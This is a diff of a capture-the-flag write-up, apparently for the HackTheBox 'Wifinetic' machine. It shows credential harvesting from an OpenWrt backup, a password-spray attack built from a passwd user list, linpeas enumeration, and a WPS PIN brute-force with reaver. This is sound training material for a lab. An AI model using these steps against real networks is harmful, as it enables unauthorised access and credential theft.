@@ -105,11 +105,11 @@ mget employees_wellness.pdf [anpqy?]? y
 After checking the PDF and TXT files, this is what we have:
 - The `ProjectOpenWRT.pdf` file has the name of the Network Admin:
 
-	![](olivia_admin.png)
+	![](olivia_admin.png){: .normal width="55%"}
 
 - The `employees_wellness.pdf` has the name of the HR Manager:
 
-	![](samantha_hr.png)
+	![](samantha_hr.png){: .normal width="70%"}
 
 Other than that, nothing really interesting. We can continue by extracting the archive now:
 
@@ -139,9 +139,9 @@ drwxr-xr-x 3 kali kali 4096 Sep 11 16:22 opkg
 ```
 
 The archive included a ton of files. After going through everything, we have:
-- A list of users provided by `passwd`
-- A list of groups within `group`
-- An interesting comment at the end of the `profile` file
+- A list of users provided by the `passwd` file.
+- A list of groups within the `group` file.
+- An interesting comment at the end of the `profile` file.
 
 ```bash
 $ cat passwd
@@ -186,34 +186,12 @@ EOF
 fi
 ```
 
-Based on the SSH comment above, we can try logging into SSH as `root` with no password, but that does not work! After searching some more, we find another interesting file:
+Based on the SSH comment above, we can try logging into SSH as `root` with no password, but that does not work! After searching some more, we find a file that includes a plaintext password:
 
 ```bash
 $ cat wireless
 
-config wifi-device 'radio0'
-        option type 'mac80211'
-        option path 'virtual/mac80211_hwsim/hwsim0'
-        option cell_density '0'
-        option channel 'auto'
-        option band '2g'
-        option txpower '20'
-
-config wifi-device 'radio1'
-        option type 'mac80211'
-        option path 'virtual/mac80211_hwsim/hwsim1'
-        option channel '36'
-        option band '5g'
-        option htmode 'HE80'
-        option cell_density '0'
-
-config wifi-iface 'wifinet0'
-        option device 'radio0'
-        option mode 'ap'
-        option ssid 'OpenWrt'
-        option encryption 'psk'
-        option key 'VeRyUniUqWiFIPasswrd1!'
-        option wps_pushbutton '1'
+<SNIP>
 
 config wifi-iface 'wifinet1'
         option device 'radio1'
@@ -224,11 +202,12 @@ config wifi-iface 'wifinet1'
         option key 'VeRyUniUqWiFIPasswrd1!'
 ```
 
-Since we have now a password, we can try to construct a list of users from the `passwd` file, and then try a password-spray attack:
+Since we have now a password, we can try to create a list of users based on the `passwd` file, and then try performing a **password-spray attack**:
 
 ```bash
 # separate the lines using ':' as a delimiter, keep the first field, and write the results on a file
 $ cat passwd | cut -d : -f 1 > userList
+# display file's content
 $ cat userList
 root
 daemon
@@ -324,7 +303,7 @@ wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-There are multiple network interfaces which could mean something. Since we don't see any direct privelege escalation path, we can try getting some help from [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS):
+There are multiple network interfaces which could mean something. Since we don't see any direct privelege escalation path, we can try getting some help by running the [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) script on the target:
 
 ```bash
 # launch a python server from the directory where linpeas.sh is located
@@ -355,11 +334,9 @@ Files with capabilities (limited to 50):
 <SNIP>
 ```
 
-We have used **capabilities** for privilege escalation [before](https://cspanias.github.io/posts/THM-Kiba/#32-capabilities), so let's try if it will also work for this box.
+We have used **capabilities** for privilege escalation [before](https://cspanias.github.io/posts/THM-Kiba/#32-capabilities), so let's try to replicate this here:
 
 >  Linux divides the privileges traditionally associated with superuser into distinct units, known as [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), which can be independently enabled and disabled. Capabilities are a per-thread attribute. In brief, capabilities provide granular control of the root’s permissions. 
-
-By reading [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#binaries-capabilities) HackTricks article, we can find out that binaries can also have capabilities as well as that we can use the getcap command to search for them:
 
 ```bash
 # search for files with capabilities
@@ -371,7 +348,13 @@ netadmin@wifinetic:~$ getcap -r / 2>/dev/null
 /usr/bin/reaver = cap_net_raw+ep
 ```
 
-[Reaver](https://github.com/t6x/reaver-wps-fork-t6x) is an open-source command-line tool used for performing **brute-force attacks against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases**. For performing the attack we need to know the **monitoring interface** and the **Basic Service Set Identifier (BSSID)** of the target.
+Sadly, this time none of the files above is listed on the [GTFOBins](https://gtfobins.github.io/) website. However, the `reaver` tool kind of stands out from the above list. [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) is an open-source command-line tool used for performing **brute-force attacks against Wifi Protected Setup (WPS) registrar PINs in order to recover WPA/WPA2 passphrases**.
+
+The `cap_net_raw+ep` capability is set for a WiFi attacking tool on a machine called Wifinetic...I think we onto something!
+
+> More on [Linux capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities).
+
+For performing the attack with `reaver` we need to know the **monitoring interface** and the **Basic Service Set Identifier (BSSID)** of the target.
 
 ```bash
 netadmin@wifinetic:~$ reaver
@@ -384,7 +367,7 @@ Required Arguments:
         -b, --bssid=<mac>               BSSID of the target AP
 ```
 
-We already found the monitoring interface before (`mon0`):
+We already know the monitoring interface from the `ifconfig` command's output before:
 
 ```bash
 netadmin@wifinetic:/$ ifconfig
@@ -401,7 +384,7 @@ mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 <SNIP>
 ```
 
-So all we have to do, if to scan for Wi-Fi networks and find the BSSID:
+So all we have to do, is to scan for Wi-Fi networks and find the BSSID:
 
 ```bash
 # scan for wifi networks
@@ -445,7 +428,7 @@ hwsim0    Interface doesn't support scanning.
 wlan0     No scan results
 ```
 
-We can see the BSSID number on the `wlan1` interface: `02:00:00:00:00:00`. We are now ready to attack WPS with `reaver`:
+We can see the BSSID number on the `wlan1` interface with the value of `02:00:00:00:00:00`. We are now ready to attack WPS with `reaver`:
 
 ```bash
 netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00
